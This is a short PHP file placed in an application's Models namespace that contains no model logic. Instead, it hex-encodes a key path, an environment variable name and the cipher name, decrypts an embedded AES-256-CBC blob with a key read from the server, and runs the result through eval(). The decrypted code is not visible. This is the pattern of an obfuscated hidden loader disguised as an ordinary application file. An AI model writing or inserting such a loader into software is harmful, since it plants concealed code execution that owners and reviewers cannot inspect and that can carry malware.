<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('WV6T9AuJivvoFpUbnAijqQ==');

$c=base64_decode(

'Le8rWpWtZkCQYijGUOsadOhY6yBMraEAybAp+qVC+ua1RtYGJuVsViWIGSjcKxPMy3gjBD5nFmMP' .
'cSVbf/uKIkYyes97LFxAFwp5h6iIeja4j5xnm2sYwnfroBp72VJ0MFyYNsMntj8JVaVcaBtVJBEa' .
'nBFbN6Hz1vqFQ0ZhOuUAhZvfFd3u0KzSwe70aKmKYxNV0jutSR0xzx1WfYLp9+U3MeRAh6mcALRH' .
'xFajb4EHMSAHEALiybqDwHg+2KM+OOBU1XdY5dU25jkh8xfYX/JZZb9xNicEIqvExUi5zNcASJ5+' .
'LuU4Oeml/zHl2rePp8p5ov1fmJ9iIAJnWtelS9FlUjVusb7r1FDvVTST+Le56eBaMBuneT0RpwtG' .
'LWTElh2j5gCFhQ3WRSGZLOtD+cOGMwv1wA/Xt7+b7bmbQ88Hpj/p0+McWjKldT7XzOyBNqWcWuRJ' .
'KjuhEQdX9dN+2+PH+2VCvuAiLsD0O2tpuq/FPlNEANnD6PDsxsEacxdltU5KeZDYYsS7SLPuJNrP' .
'IzRZ/2mZ0Q+N0fQd+xC0w9QSlw3DqpkWTElss1u0rgeONAyFqNDcNGJV/lpZw4Sl2mQC9bxVnXkQ' .
'PWVR872N0e0wn+2iQY6KMk7SjonZYEmOVWgZUYEAwevgoV9yA5mrIQRm2I2eT4do9wbp9tYbDmX5' .
'/QCNzILq66VGV9CIJKLgTdegExqmjUbaQlUrmPeYb22rSmHXkqTBq2OElqn00NA/URo81wCTdsAf' .
'Cz1fdYmluYaljg7KpuTosTxNmlo/tsJ7qEXx/kNx+Pwgu0cj2Ge+oeKdZVSfgt/6QuZJ2PWTQ8Lv' .
'bwHjYCTqLfYgiZ62myGuCvErRT0g9HZxW3zi9BT9VYIXfAd7qMR0xseUKwfE018ccb3KYcmpdeKY' .
'yKEg5GE0kM27QeqYTC/Jwl6eNFxM00q4gWnyqJYFfi4xJyB7AAQIlDmntG0zx46nwol37g=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

